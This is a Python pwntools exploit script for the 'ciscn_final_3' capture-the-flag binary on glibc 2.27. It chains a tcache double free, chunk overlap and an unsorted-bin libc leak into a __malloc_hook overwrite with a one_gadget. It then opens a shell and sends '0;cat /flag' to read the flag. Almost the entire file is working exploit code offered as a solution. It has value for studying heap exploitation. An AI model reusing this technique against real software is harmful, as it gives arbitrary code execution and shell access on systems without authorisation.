# coding:utf-8
# ubuntu18, glibc-2.27.so 
# tcache
# malloc hook
from pwn import *
context.log_level = 'debug'

proc_name = 'ciscn_final_3'
islocal = 1
libc = ELF('./libc.so.6')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 29766)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(index, size, content):
    global gift
    p.recvuntil("choice > ")
    p.sendline("1")
    p.recvuntil("input the index\n")
    p.sendline(str(index))
    p.recvuntil("input the size\n")
    p.sendline(str(size))
    p.recvuntil("write something\n")
    p.send(content)
    p.recvline()
    p.recvuntil("gift :")
    heap = p.recvline()[2:]
    heap_str = '0x' + heap
    log.success('type => str |' + 'gift => ' + heap_str)
    heap_addr = int(heap,16)
    log.success('type => hex |' + 'heap_addr => ' + hex(heap_addr) )

    return heap_addr

def remove(index):
    p.recvuntil("choice > ")
    p.sendline("2")
    p.recvuntil("input the index\n")
    p.sendline(str(index))

if __name__ == '__main__':
    heap_start = add(0, 0x78, 'a')
    # debug(0)
    # pause()
    add(1,0x18,'b')     # chunk1
    add(2,0x78,'c')     # chunk2
    add(3,0x78,'d')     # chunk3 
    add(4,0x78,'c')     # chunk4
    add(5,0x78,'d')     # chunk5 
    add(6,0x78,'c')     # chunk6
    add(7,0x78,'d')     # chunk7 
    add(8,0x78,'c')     # chunk8
    add(9,0x78,'d')     # chunk9 
    add(10,0x78,'c')    # chunk10
    add(11,0x78,'d')    # chunk11
    add(12,0x28,'d')    # chunk12       
    # debug(0)

    # double free
    remove(12)
    # debug(0)
    remove(12)
    # debug(0)   
    add(13, 0x28, p64(heap_start - 0x10))       
    # debug(0)
    add(14, 0x28, p64(heap_start-0x10)) #5
    # debug(0)
    add(15,0x28,p64(0)+p64(0x421))
    # debug(0)

    #overlap
    remove(0)         # unsort_bin chunk0->fd = libc
    # debug(0)
    remove(1)         # tcache
    # debug(0)
    add(16,0x78,'e')#7  从unsortbin分下一块,后面依然在unsortbin里 chunk1 -> fd = libc
    debug(0)
    add(17,0x18,'f')#8  get chunk1
    # debug(0)
    libc_base=add(18,0x18,'g')-0x3ebca0#9   get libc
    malloc_hook=libc_base+libc.sym['__malloc_hook']
    one_gadget=libc_base+0x10a38c
    print(hex(libc_base),hex(malloc_hook))

    #dup
    remove(5)
    remove(5)
    add(19,0x78,p64(malloc_hook))
    add(20,0x78,p64(malloc_hook))
    add(21,0x78,p64(one_gadget))
    #getshell
    p.sendline('1')
    p.sendline('22')
    p.sendline('0;cat /flag')

    p.interactive()